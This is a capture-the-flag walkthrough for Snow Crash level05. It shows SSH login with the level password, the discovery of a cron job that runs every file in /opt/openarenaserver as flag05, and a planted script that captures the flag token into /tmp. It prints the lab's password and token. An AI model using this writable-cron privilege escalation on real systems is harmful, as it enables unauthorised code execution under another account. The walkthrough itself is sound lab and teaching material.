Login as `level05`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level05
level05@192.168.1.64's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
```
Once logged into `level05` a message says that there is a new mail.
As `mail` program is not installed, it's likely to be in the spool file `/var/mail/$USER`
```shell
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Seems that there is a `cron` job which executes the above command at every 2nd minute.

Looking inside scripts shows a loop which iterate through all the files in `/opt/openarenaserver/` and evaluate them.

`ulimit -t` means that the following process should be terminated if it uses more CPU time than what is specified in `-t`. Then the file is removed.
```shell
level05@SnowCrash:/opt/openarenaserver$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Create a script which will get the flag and redirect the output into `/tmp/flag05`.
```shell
level05@SnowCrash:~$ vi /opt/openarenaserver/getflag.sh
#!/bin/bash
/bin/getflag > /tmp/flag05
```
Change file modes by setting on execute bits.
```shell
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
```
Execute cat program periodically on `/tmp/flag05`.
```shell
level05@SnowCrash:~$ watch -n 0.1 cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
